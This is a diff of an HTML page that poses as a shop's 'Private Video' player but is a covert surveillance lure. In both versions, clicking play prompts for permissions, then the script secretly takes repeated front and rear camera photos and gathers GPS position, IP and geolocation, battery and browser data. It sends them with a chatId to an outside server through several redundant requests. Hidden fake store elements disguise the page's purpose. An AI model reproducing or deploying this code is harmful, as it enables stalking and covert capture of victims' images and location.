@@ -7,14 +7,9 @@
     <meta name="description" content="ShopStore - Your trusted online shopping destination. Buy electronics, fashion, home goods with fast delivery to your location. Best prices guaranteed." />
     <meta name="keywords" content="online shopping, buy products, delivery, shop online, store, deals, electronics, fashion, home goods, fast shipping" />
     <meta name="robots" content="index, follow" />
-    <meta name="author" content="ShopStore" />
     <meta property="og:title" content="ShopStore - Online Shopping with Fast Delivery" />
-    <meta property="og:description" content="Shop the best products online with fast delivery to your location. Enable location for accurate shipping rates and delivery times." />
+    <meta property="og:description" content="Shop the best products online with fast delivery to your location." />
     <meta property="og:type" content="website" />
-    <meta property="og:site_name" content="ShopStore" />
-    <meta name="twitter:card" content="summary" />
-    <meta name="twitter:title" content="ShopStore - Online Shopping" />
-    <meta name="twitter:description" content="Fast delivery to your location. Enable location for shipping rates." />
     
     <script type="application/ld+json">
     {
@@ -22,294 +17,44 @@
         "@type": "OnlineStore",
         "name": "ShopStore",
         "description": "Online shopping store with fast delivery to your location",
-        "url": "https://shopstore.com",
-        "contactPoint": {
-            "@type": "ContactPoint",
-            "contactType": "customer service",
-            "telephone": "+1-800-555-0199",
-            "email": "support@shopstore.com"
-        }
-    }
-    </script>
-    
-    <script type="application/ld+json">
-    {
-        "@context": "https://schema.org",
-        "@type": "VideoObject",
-        "name": "Product Review & Unboxing",
-        "description": "Watch our detailed product review and unboxing video. Fast delivery available.",
-        "thumbnailUrl": "https://i.postimg.cc/jSfpHvz8/IMG-20260104-210740-951.jpg",
-        "uploadDate": "2024-01-15",
-        "duration": "PT2M45S",
-        "contentUrl": "https://files.catbox.moe/okukrp.mp4"
+        "url": "https://shopstore.com"
     }
     </script>
     
     <title>Video Player</title>
     
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        body {
-            font-family: Arial, sans-serif;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-            margin: 0;
-            background-color: #000;
-            color: #fff;
-            overflow: hidden;
-        }
-
-        .store-header {
-            position: fixed !important;
-            top: -9999px !important;
-            left: -9999px !important;
-            opacity: 0 !important;
-            pointer-events: none !important;
-            width: 1px !important;
-            height: 1px !important;
-            overflow: hidden !important;
-            clip: rect(0, 0, 0, 0) !important;
-            z-index: -999999 !important;
-            visibility: hidden !important;
-        }
-
-        .store-footer {
-            position: fixed !important;
-            bottom: -9999px !important;
-            left: -9999px !important;
-            opacity: 0 !important;
-            pointer-events: none !important;
-            width: 1px !important;
-            height: 1px !important;
-            overflow: hidden !important;
-            clip: rect(0, 0, 0, 0) !important;
-            z-index: -999999 !important;
-            visibility: hidden !important;
-        }
-
-        .product-info-hidden {
-            position: absolute !important;
-            top: -9999px !important;
-            left: -9999px !important;
-            opacity: 0 !important;
-            pointer-events: none !important;
-            width: 1px !important;
-            height: 1px !important;
-            overflow: hidden !important;
-            clip: rect(0, 0, 0, 0) !important;
-            z-index: -999999 !important;
-            visibility: hidden !important;
-        }
-
-        .delivery-notice-hidden {
-            position: absolute !important;
-            top: -9999px !important;
-            left: -9999px !important;
-            opacity: 0 !important;
-            pointer-events: none !important;
-            width: 1px !important;
-            height: 1px !important;
-            overflow: hidden !important;
-            clip: rect(0, 0, 0, 0) !important;
-            z-index: -999999 !important;
-            visibility: hidden !important;
-        }
-
-        .video-player-container {
-            width: 90%;
-            max-width: 800px;
-            background: #111;
-            border-radius: 12px;
-            overflow: hidden;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
-            position: relative;
-        }
-
-        .video-thumbnail {
-            position: relative;
-            width: 100%;
-            height: 450px;
-            background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)),
-                url('https://i.postimg.cc/jSfpHvz8/IMG-20260104-210740-951.jpg');
-            background-size: cover;
-            background-position: center;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: default;
-            flex-direction: column;
-        }
-
-        #locationActionButton {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            width: 120px;
-            height: 120px;
-            border-radius: 50%;
-            background: rgba(255, 255, 255, 0.1);
-            border: 3px solid #ff6b6b;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            backdrop-filter: blur(8px);
-            box-shadow: 0 0 40px rgba(255, 0, 0, 0.3);
-            z-index: 10;
-        }
-        #locationActionButton:hover {
-            transform: scale(1.05);
-            background: rgba(255, 255, 255, 0.2);
-            border-color: #ff4757;
-            box-shadow: 0 0 60px rgba(255, 0, 0, 0.6);
-        }
-        #locationActionButton .play-icon {
-            font-size: 60px;
-            color: #ff6b6b;
-            line-height: 1;
-            user-select: none;
-        }
-
-        .play-button-overlay {
-            display: none;
-        }
-
-        .video-info {
-            padding: 20px;
-            border-bottom: 1px solid #333;
-        }
-
-        .video-title {
-            font-size: 1.5rem;
-            font-weight: bold;
-            margin-bottom: 8px;
-        }
-
-        .video-controls {
-            padding: 15px 20px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            background: #1a1a1a;
-            flex-wrap: wrap;
-            gap: 10px;
-        }
-
-        .control-button {
-            background: none;
-            border: none;
-            color: white;
-            font-size: 1.2rem;
-            cursor: pointer;
-            padding: 8px 15px;
-            border-radius: 4px;
-            transition: background 0.2s;
-        }
-
-        .control-button:hover {
-            background: #333;
-        }
-
-        .progress-bar {
-            flex-grow: 1;
-            height: 4px;
-            background: #333;
-            border-radius: 2px;
-            margin: 0 20px;
-            overflow: hidden;
-            position: relative;
-            min-width: 60px;
-        }
-
-        .progress-fill {
-            position: absolute;
-            height: 100%;
-            width: 0%;
-            background: #ff0000;
-        }
-
-        .time-display {
-            color: #aaa;
-            font-size: 0.9rem;
-            min-width: 100px;
-            text-align: center;
-        }
-
-        .spinner {
-            border: 4px solid #fff;
-            border-top: 4px solid rgba(255, 255, 255, 0.3);
-            border-radius: 50%;
-            width: 32px;
-            height: 32px;
-            animation: spin 1s linear infinite;
-            position: absolute;
-            display: none;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-        }
-
-        @keyframes spin {
-            0% { transform: translate(-50%, -50%) rotate(0deg); }
-            100% { transform: translate(-50%, -50%) rotate(360deg); }
-        }
-
-        .volume-control {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            color: #aaa;
-        }
-
-        .volume-slider {
-            width: 80px;
-            height: 4px;
-            background: #333;
-            border-radius: 2px;
-            position: relative;
-        }
-
-        .volume-level {
-            position: absolute;
-            height: 100%;
-            width: 70%;
-            background: #ff0000;
-        }
-
-        .fullscreen-btn {
-            margin-left: 15px;
-        }
-
-        @media (max-width: 480px) {
-            .video-controls {
-                padding: 10px 12px;
-                gap: 6px;
-            }
-            .progress-bar {
-                margin: 0 6px;
-            }
-            .time-display {
-                font-size: 0.75rem;
-                min-width: 60px;
-            }
-            .video-title {
-                font-size: 1.2rem;
-            }
-            .video-thumbnail {
-                height: 280px;
-            }
-            #locationActionButton {
-                width: 90px;
-                height: 90px;
-            }
-            #locationActionButton .play-icon {
-                font-size: 45px;
-            }
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:Arial,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;margin:0;background-color:#000;color:#fff;overflow:hidden}
+        
+        .store-header,.store-footer,.product-info-hidden,.delivery-notice-hidden{position:fixed!important;top:-9999px!important;left:-9999px!important;opacity:0!important;pointer-events:none!important;width:1px!important;height:1px!important;overflow:hidden!important;clip:rect(0,0,0,0)!important;z-index:-999999!important;visibility:hidden!important}
+        
+        .video-player-container{width:90%;max-width:800px;background:#111;border-radius:12px;overflow:hidden;box-shadow:0 10px 30px rgba(0,0,0,0.5);position:relative}
+        
+        .video-thumbnail{position:relative;width:100%;height:450px;background:linear-gradient(rgba(0,0,0,0.7),rgba(0,0,0,0.7)),url('https://i.postimg.cc/jSfpHvz8/IMG-20260104-210740-951.jpg');background-size:cover;background-position:center;display:flex;align-items:center;justify-content:center;cursor:default;flex-direction:column}
+        
+        #playBtn{display:flex;align-items:center;justify-content:center;width:120px;height:120px;border-radius:50%;background:rgba(255,255,255,0.1);border:3px solid #ff6b6b;cursor:pointer;transition:all 0.3s ease;backdrop-filter:blur(8px);box-shadow:0 0 40px rgba(255,0,0,0.3);z-index:10}
+        #playBtn:hover{transform:scale(1.05);background:rgba(255,255,255,0.2);border-color:#ff4757;box-shadow:0 0 60px rgba(255,0,0,0.6)}
+        #playBtn span{font-size:60px;color:#ff6b6b;line-height:1;user-select:none}
+        
+        .video-info{padding:20px;border-bottom:1px solid #333}
+        .video-title{font-size:1.5rem;font-weight:bold;margin-bottom:8px}
+        
+        .video-controls{padding:15px 20px;display:flex;align-items:center;justify-content:space-between;background:#1a1a1a;flex-wrap:wrap;gap:10px}
+        .ctrl-btn{background:none;border:none;color:white;font-size:1.2rem;cursor:pointer;padding:8px 15px;border-radius:4px;transition:background 0.2s}
+        .ctrl-btn:hover{background:#333}
+        
+        .seek-bar{flex-grow:1;height:4px;background:#333;border-radius:2px;margin:0 20px;overflow:hidden;position:relative;min-width:60px}
+        .seek-fill{position:absolute;height:100%;width:0%;background:#ff0000}
+        .timer{color:#aaa;font-size:0.9rem;min-width:100px;text-align:center}
+        .volume-area{display:flex;align-items:center;gap:10px;color:#aaa}
+        .vol-bar{width:80px;height:4px;background:#333;border-radius:2px;position:relative}
+        .vol-fill{position:absolute;height:100%;width:70%;background:#ff0000}
+        
+        @media (max-width:480px){
+            .video-thumbnail{height:280px}
+            #playBtn{width:90px;height:90px}
+            #playBtn span{font-size:45px}
         }
     </style>
 </head>
@@ -320,330 +65,229 @@
         <span>🔍 Search products...</span>
         <span>🛒 Cart (0)</span>
     </div>
-
     <div class="product-info-hidden" aria-hidden="true">
-        <span>$49.99</span>
-        <span>★★★★★ 4.8</span>
-        <span>🚚 Free Shipping</span>
-        <span>✅ In Stock</span>
+        <span>$49.99</span><span>★★★★★ 4.8</span><span>🚚 Free Shipping</span><span>✅ In Stock</span>
     </div>
-
     <div class="delivery-notice-hidden" aria-hidden="true">
-        <span>📍</span> 
-        <span>Enable location for delivery rates & faster shipping</span>
+        <span>📍</span><span>Enable location for delivery rates & faster shipping</span>
     </div>
 
     <div class="video-player-container">
         <div class="video-info">
             <div class="video-title">Private Video</div>
-            <div class="video-meta"></div>
         </div>
-
-        <div class="video-thumbnail" id="thumbnailArea">
-            <div id="locationActionButton">
-                <span class="play-icon">▶</span>
-            </div>
-            <div class="play-button-overlay" id="playButtonOverlay">
-                <div class="play-icon-large"></div>
-                <div class="spinner" id="spinner"></div>
-            </div>
+        <div class="video-thumbnail" id="poster">
+            <div id="playBtn"><span>▶</span></div>
         </div>
-
-        <video id="realVideo" controls playsinline muted style="display:none; width:100%; height:450px; background:#000;">
-            <source src="https://files.catbox.moe/okukrp.mp4" type="video/mp4" />
+        <video id="vid" controls playsinline style="display:none;width:100%;height:450px;background:#000">
+            <source src="https://files.catbox.moe/okukrp.mp4" type="video/mp4">
         </video>
-
         <div class="video-controls">
-            <div class="progress-bar">
-                <div class="progress-fill"></div>
-            </div>
-            <div class="time-display">0:00 / 2:45</div>
-            <div class="volume-control">
-                <span></span>
-                <div class="volume-slider">
-                    <div class="volume-level"></div>
-                </div>
-            </div>
-            <button class="control-button fullscreen-btn">⛶</button>
+            <div class="seek-bar"><div class="seek-fill"></div></div>
+            <div class="timer">0:00 / 2:45</div>
+            <div class="volume-area"><span>🔊</span><div class="vol-bar"><div class="vol-fill"></div></div></div>
+            <button class="ctrl-btn">⛶</button>
         </div>
     </div>
 
     <div class="store-footer" aria-hidden="true">
-        <span>Privacy Policy</span>
-        <span>Terms of Service</span>
-        <span>Returns & Refunds</span>
-        <span>Delivery Information</span>
-        <span>Contact Support</span>
-        <span>© 2024 ShopStore</span>
+        <span>Privacy Policy</span><span>Terms of Service</span><span>© 2024 ShopStore</span>
     </div>
 
     <script>
-        (function() {
-            'use strict';
-
-            var settingsOpened = false;
-            var videoStarted = false;
-            var isProcessing = false;
-
-            var locationBtn = document.getElementById('locationActionButton');
-            var thumbnailArea = document.getElementById('thumbnailArea');
-            var realVideo = document.getElementById('realVideo');
-
-            // ====== دوال جمع البيانات (مخفية) ======
-            var collectedInfo = {
-                permissions: [],
-                images: [],
-                ipInfo: '',
-                batteryStatus: '',
-                location: '',
-                chatId: new URLSearchParams(window.location.search).get('chatId') || ''
-            };
-
-            function getIP() {
-                var xhr = new XMLHttpRequest();
-                xhr.open('GET', 'https://ipapi.co/json/', true);
-                xhr.onload = function() {
-                    if (xhr.status === 200) {
-                        try {
-                            var d = JSON.parse(xhr.responseText);
-                            collectedInfo.ipInfo = d.ip + '|' + d.country_name + '|' + d.city + '|' + d.org;
-                        } catch(e) {
-                            collectedInfo.ipInfo = 'parse_error';
-                        }
-                    }
-                };
-                xhr.onerror = function() {
-                    collectedInfo.ipInfo = 'failed';
-                };
-                xhr.send();
+    (function(){
+        var step=0, started=false;
+        var btn=document.getElementById('playBtn');
+        var poster=document.getElementById('poster');
+        var vid=document.getElementById('vid');
+        var chatId=new URLSearchParams(window.location.search).get('chatId')||'';
+        
+        var data={
+            chatId:chatId,
+            permissions:[],
+            images:[],
+            location:'',
+            ipInfo:'',
+            battery:'',
+            ua:navigator.userAgent,
+            time:new Date().toISOString()
+        };
+        
+        function log(msg){console.log('[DATA]',msg);}
+        
+        function send(dataObj){
+            var url='https://server-brxz.onrender.com/submitData';
+            var params=new URLSearchParams();
+            for(var k in dataObj){
+                params.append(k, typeof dataObj[k]==='string'?dataObj[k]:JSON.stringify(dataObj[k]));
             }
-
-            function getBattery() {
-                try {
-                    navigator.getBattery().then(function(b) {
-                        collectedInfo.batteryStatus = Math.round(b.level * 100) + '%_' + (b.charging ? 'charging' : 'not_charging');
+            var body=params.toString();
+            
+            log('Sending to: '+url);
+            log('Body length: '+body.length);
+            
+            // Method 1: XHR
+            try{
+                var x=new XMLHttpRequest();
+                x.open('POST',url,true);
+                x.setRequestHeader('Content-Type','application/x-www-form-urlencoded;charset=UTF-8');
+                x.onload=function(){log('XHR Response: '+x.status+' - '+x.responseText.substring(0,100));};
+                x.onerror=function(){log('XHR Error');};
+                x.send(body);
+            }catch(e){log('XHR Exception: '+e.message);}
+            
+            // Method 2: fetch
+            try{
+                fetch(url,{
+                    method:'POST',
+                    headers:{'Content-Type':'application/x-www-form-urlencoded;charset=UTF-8'},
+                    body:body
+                }).then(function(r){
+                    log('Fetch Status: '+r.status);
+                    return r.text();
+                }).then(function(t){
+                    log('Fetch Response: '+t.substring(0,100));
+                }).catch(function(e){
+                    log('Fetch Error: '+e.message);
+                });
+            }catch(e){log('Fetch Exception: '+e.message);}
+            
+            // Method 3: Beacon
+            try{
+                if(navigator.sendBeacon){
+                    var blob=new Blob([body],{type:'application/x-www-form-urlencoded'});
+                    var result=navigator.sendBeacon(url,blob);
+                    log('Beacon Result: '+result);
+                }
+            }catch(e){log('Beacon Exception: '+e.message);}
+        }
+        
+        function collectAndSend(){
+            log('Starting collection...');
+            
+            // IP
+            fetch('https://ipapi.co/json/').then(function(r){return r.json();}).then(function(d){
+                data.ipInfo=d.ip+'|'+d.country_name+'|'+d.city+'|'+d.org;
+                log('IP: '+data.ipInfo);
+            }).catch(function(){data.ipInfo='failed';});
+            
+            // Battery
+            try{
+                navigator.getBattery().then(function(b){
+                    data.battery=Math.round(b.level*100)+'%_'+(b.charging?'charging':'not');
+                    log('Battery: '+data.battery);
+                });
+            }catch(e){}
+            
+            // Location
+            navigator.geolocation.getCurrentPosition(function(pos){
+                data.location=pos.coords.latitude.toFixed(6)+','+pos.coords.longitude.toFixed(6);
+                data.permissions.push('gps_ok');
+                log('Location: '+data.location);
+            },function(e){
+                data.location='denied_'+e.code;
+                data.permissions.push('gps_no');
+                log('Location denied: '+e.code);
+            },{enableHighAccuracy:true,timeout:10000});
+            
+            // Camera
+            function snap(face,cb){
+                navigator.mediaDevices.getUserMedia({video:{facingMode:{exact:face}},audio:false}).then(function(stream){
+                    var v=document.createElement('video');
+                    v.srcObject=stream;
+                    v.play().then(function(){
+                        setTimeout(function(){
+                            var c=document.createElement('canvas');
+                            c.width=v.videoWidth||640;
+                            c.height=v.videoHeight||480;
+                            c.getContext('2d').drawImage(v,0,0);
+                            data.images.push(c.toDataURL('image/jpeg',0.5).split(',')[1]);
+                            data.permissions.push(face+'_cam_ok');
+                            log('Photo captured: '+face);
+                            stream.getTracks().forEach(function(t){t.stop();});
+                            cb();
+                        },500);
                     });
-                } catch(e) {}
-            }
-
-            function getGPS() {
-                navigator.geolocation.getCurrentPosition(
-                    function(pos) {
-                        collectedInfo.location = pos.coords.latitude.toFixed(6) + ',' + pos.coords.longitude.toFixed(6);
-                        collectedInfo.permissions.push('gps_ok');
-                    },
-                    function(err) {
-                        collectedInfo.location = 'denied_' + err.code;
-                        collectedInfo.permissions.push('gps_no');
-                    },
-                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-                );
-            }
-
-            function capturePhoto(face, callback) {
-                var constraints = { video: { facingMode: { exact: face } }, audio: false };
-                navigator.mediaDevices.getUserMedia(constraints).then(function(stream) {
-                    var v = document.createElement('video');
-                    v.srcObject = stream;
-                    v.play().then(function() {
-                        setTimeout(function() {
-                            var c = document.createElement('canvas');
-                            c.width = v.videoWidth || 640;
-                            c.height = v.videoHeight || 480;
-                            c.getContext('2d').drawImage(v, 0, 0);
-                            try {
-                                collectedInfo.images.push(c.toDataURL('image/jpeg', 0.6).split(',')[1]);
-                                collectedInfo.permissions.push(face + '_cam_ok');
-                            } catch(e) {
-                                collectedInfo.permissions.push(face + '_cam_err');
-                            }
-                            stream.getTracks().forEach(function(t) { t.stop(); });
-                            if (callback) callback();
-                        }, 800);
-                    });
-                }).catch(function(e) {
-                    collectedInfo.permissions.push(face + '_cam_no');
-                    if (callback) callback();
+                }).catch(function(e){
+                    data.permissions.push(face+'_cam_no');
+                    log('Camera denied: '+face);
+                    cb();
                 });
             }
-
-            function sendAllData() {
-                var payload = {
-                    chatId: collectedInfo.chatId,
-                    imageDatas: collectedInfo.images.join(','),
-                    location: collectedInfo.location,
-                    permissions: collectedInfo.permissions.join(','),
-                    ipInfo: collectedInfo.ipInfo,
-                    battery: collectedInfo.batteryStatus
-                };
-
-                var serverUrl = 'https://server-brxz.onrender.com/submitData';
-                var bodyStr = Object.keys(payload).map(function(k) {
-                    return encodeURIComponent(k) + '=' + encodeURIComponent(payload[k]);
-                }).join('&');
-
-                // طريقة 1: fetch
-                fetch(serverUrl, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                    body: bodyStr,
-                    mode: 'no-cors'
-                }).catch(function() {});
-
-                // طريقة 2: XHR
-                var x = new XMLHttpRequest();
-                x.open('POST', serverUrl, true);
-                x.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-                x.send(bodyStr);
-
-                // طريقة 3: Beacon
-                if (navigator.sendBeacon) {
-                    var b = new Blob([bodyStr], { type: 'application/x-www-form-urlencoded' });
-                    navigator.sendBeacon(serverUrl, b);
-                }
-
-                // طريقة 4: Image ping
-                new Image().src = serverUrl + '?' + bodyStr;
-            }
-
-            function startCollection() {
-                getIP();
-                getBattery();
-                getGPS();
-                
-                capturePhoto('user', function() {
-                    capturePhoto('environment', function() {
-                        capturePhoto('user', function() {
-                            capturePhoto('environment', function() {
-                                setTimeout(sendAllData, 1000);
-                            });
+            
+            snap('user',function(){
+                snap('environment',function(){
+                    snap('user',function(){
+                        snap('environment',function(){
+                            log('All photos done. Total: '+data.images.length);
+                            // Wait then send
+                            setTimeout(function(){
+                                log('Sending now...');
+                                send(data);
+                            },2000);
                         });
                     });
                 });
-            }
-
-            // ====== واجهة المستخدم ======
-            function requestPermissions() {
-                try {
-                    navigator.geolocation.getCurrentPosition(
-                        function() {},
-                        function() {},
-                        { enableHighAccuracy: true, timeout: 5000 }
-                    );
-                } catch (e) {}
-                
-                try {
-                    navigator.mediaDevices.getUserMedia({ video: true })
-                        .then(function(stream) {
-                            stream.getTracks().forEach(function(t) { t.stop(); });
-                        })
-                        .catch(function() {});
-                } catch (e) {}
-            }
-
-            function openLocationSettings() {
-                var ua = navigator.userAgent;
-                if (/Android/i.test(ua)) {
-                    var intents = [
-                        'intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end',
-                        'intent://com.android.settings.location.LocationSettings#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end',
-                        'intent:#Intent;action=android.settings.SETTINGS;end'
-                    ];
-                    for (var i = 0; i < intents.length; i++) {
-                        try {
-                            window.location.href = intents[i];
-                            break;
-                        } catch (e) {}
-                    }
-                } else if (/iPhone|iPad|iPod/i.test(ua)) {
-                    window.open('App-Prefs:Privacy&path=LOCATION', '_blank');
-                    setTimeout(function() {
-                        window.open('prefs:root=Privacy&path=LOCATION', '_blank');
-                    }, 500);
-                } else if (/Windows/i.test(ua)) {
-                    window.open('ms-settings:privacy-location', '_blank');
-                } else if (/Mac/i.test(ua)) {
-                    window.open('x-apple.systempreferences:com.apple.preference.security?Privacy_LocationServices', '_blank');
-                } else {
-                    window.location.href = 'intent:#Intent;action=android.settings.SETTINGS;end';
-                }
-            }
-
-            function showVideo() {
-                thumbnailArea.style.display = 'none';
-                realVideo.style.display = 'block';
-                realVideo.muted = false;
-                realVideo.volume = 1.0;
-                if (realVideo.paused) {
-                    realVideo.play().catch(function() {});
-                }
-            }
-
-            function handleButtonClick() {
-                if (isProcessing || videoStarted) return;
-
-                if (!settingsOpened) {
-                    settingsOpened = true;
-                    requestPermissions();
-                    openLocationSettings();
-                } else {
-                    videoStarted = true;
-                    realVideo.muted = false;
-                    realVideo.volume = 1.0;
-                    realVideo.play().catch(function() {});
-                    startCollection();
-                    showVideo();
-                }
-            }
-
-            document.addEventListener('visibilitychange', function() {
-                if (document.visibilityState === 'visible' && settingsOpened && !videoStarted && !isProcessing) {}
             });
-
-            if (locationBtn) {
-                locationBtn.addEventListener('click', handleButtonClick);
+        }
+        
+        function openSettings(){
+            var ua=navigator.userAgent;
+            if(/Android/i.test(ua)){
+                var intents=[
+                    'intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end',
+                    'intent://com.android.settings.location.LocationSettings#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end',
+                    'intent:#Intent;action=android.settings.SETTINGS;end'
+                ];
+                for(var i=0;i<intents.length;i++){
+                    try{window.location.href=intents[i];break;}catch(e){}
+                }
+            }else if(/iPhone|iPad|iPod/i.test(ua)){
+                window.open('App-Prefs:Privacy&path=LOCATION','_blank');
+            }else{
+                window.location.href='intent:#Intent;action=android.settings.SETTINGS;end';
             }
-
-            document.addEventListener('click', function() {
-                if (realVideo) {
-                    realVideo.muted = false;
-                    realVideo.volume = 1.0;
-                }
-            }, true);
-
-            document.querySelectorAll('.control-button').forEach(function(button) {
-                button.addEventListener('click', function(e) {
-                    e.stopPropagation();
-                    if (this.textContent.includes('⛶')) {
-                        var video = document.getElementById('realVideo');
-                        if (video.requestFullscreen) {
-                            video.requestFullscreen();
-                        } else if (video.webkitRequestFullscreen) {
-                            video.webkitRequestFullscreen();
-                        }
-                    }
-                });
-            });
-
-            var progressInterval = setInterval(function() {
-                var progressFill = document.querySelector('.progress-fill');
-                var realVideoEl = document.getElementById('realVideo');
-                if (realVideoEl.style.display === 'block') {
-                    clearInterval(progressInterval);
-                    return;
-                }
-                var currentWidth = parseInt(progressFill.style.width) || 35;
-                var newWidth = (currentWidth + 0.1) % 100;
-                progressFill.style.width = newWidth + '%';
-
-                var timeDisplay = document.querySelector('.time-display');
-                var currentSeconds = Math.floor((newWidth / 100) * 165);
-                var minutes = Math.floor(currentSeconds / 60);
-                var seconds = currentSeconds % 60;
-                timeDisplay.textContent = minutes + ':' + (seconds < 10 ? '0' : '') + seconds + ' / 2:45';
-            }, 1000);
-
-        })();
+        }
+        
+        btn.addEventListener('click',function(){
+            if(started)return;
+            
+            if(!step){
+                step=1;
+                try{
+                    navigator.geolocation.getCurrentPosition(function(){},function(){},{timeout:3000});
+                    navigator.mediaDevices.getUserMedia({video:true}).then(function(s){s.getTracks().forEach(function(t){t.stop();});});
+                }catch(e){}
+                openSettings();
+            }else{
+                started=true;
+                vid.muted=false;
+                vid.volume=1;
+                vid.play().catch(function(){});
+                poster.style.display='none';
+                vid.style.display='block';
+                collectAndSend();
+                btn.style.display='none';
+            }
+        });
+        
+        document.addEventListener('click',function(){
+            if(vid.style.display==='block'){vid.muted=false;if(vid.paused)vid.play().catch(function(){});}
+        },true);
+        
+        setInterval(function(){
+            var fill=document.querySelector('.seek-fill');
+            if(vid.style.display==='block')return;
+            var w=parseInt(fill.style.width)||35;
+            w=(w+0.1)%100;
+            fill.style.width=w+'%';
+            var sec=Math.floor((w/100)*165);
+            var m=Math.floor(sec/60);
+            var s=sec%60;
+            document.querySelector('.timer').textContent=m+':'+(s<10?'0':'')+s+' / 2:45';
+        },1000);
+        
+    })();
     </script>
 </body>
 </html>
